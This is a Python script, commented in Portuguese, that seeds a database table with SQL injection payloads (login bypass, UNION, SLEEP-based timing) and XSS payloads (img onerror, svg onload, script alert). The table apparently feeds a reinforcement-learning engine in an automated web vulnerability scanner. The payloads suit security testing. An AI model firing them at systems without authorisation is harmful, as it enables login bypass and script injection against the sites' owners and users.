"""Popula public.cache_payloads com um arsenal maior por categoria de campo.

Hoje a tabela só tem 1 payload por `tipo_ataque` (credencial_senha,
credencial_identificador, campo_generico) — o que faz a seleção via pgvector +
score_confianca (`FeedbackService.classificar_e_obter_payload_por_ia`) não ter
de fato o que "escolher". Este script insere mais candidatos por categoria
(evitando duplicar payloads já existentes) para o motor de RL ter opções reais
para comparar/pontuar ao longo dos scans.

Depois de rodar isso, rode `populate_cache_payloads_embeddings.py` para gerar
os embeddings dos novos registros (ele já atualiza qualquer linha, novas ou
antigas).
"""

import os

import psycopg2
from dotenv import load_dotenv

load_dotenv()

PAYLOADS_POR_CATEGORIA = {
    "credencial_senha": [
        "' OR '1'='1'-- -",
        "' OR 1=1#",
        "') OR ('1'='1",
        "' OR 'x'='x",
        "' OR SLEEP(5)-- -",
        "%' OR '1'='1",
    ],
    "credencial_identificador": [
        "admin' OR '1'='1",
        "' UNION SELECT NULL,NULL--",
        "administrator",
        "root'--",
        "' OR 1=1 LIMIT 1--",
        "admin'/*",
    ],
    "campo_generico": [
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "\"><script>alert(1)</script>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><svg/onload=alert(1)>",
    ],
}


def main() -> None:
    conn_string = os.getenv("DATABASE_URL")
    if not conn_string:
        raise RuntimeError("Defina DATABASE_URL no .env")

    with psycopg2.connect(conn_string) as conn:
        with conn.cursor() as cur:
            cur.execute("SELECT tipo_ataque, payload FROM public.cache_payloads;")
            existentes = {(tipo, payload) for tipo, payload in cur.fetchall()}

            inseridos = 0
            for categoria, payloads in PAYLOADS_POR_CATEGORIA.items():
                for payload in payloads:
                    if (categoria, payload) in existentes:
                        continue
                    cur.execute(
                        """
                        INSERT INTO public.cache_payloads (origem_api, payload, tipo_ataque)
                        VALUES (%s, %s, %s)
                        """,
                        ("seed_manual", payload, categoria),
                    )
                    inseridos += 1
            conn.commit()
            print(f"[+] {inseridos} novos payloads inseridos em cache_payloads.")


if __name__ == "__main__":
    main()
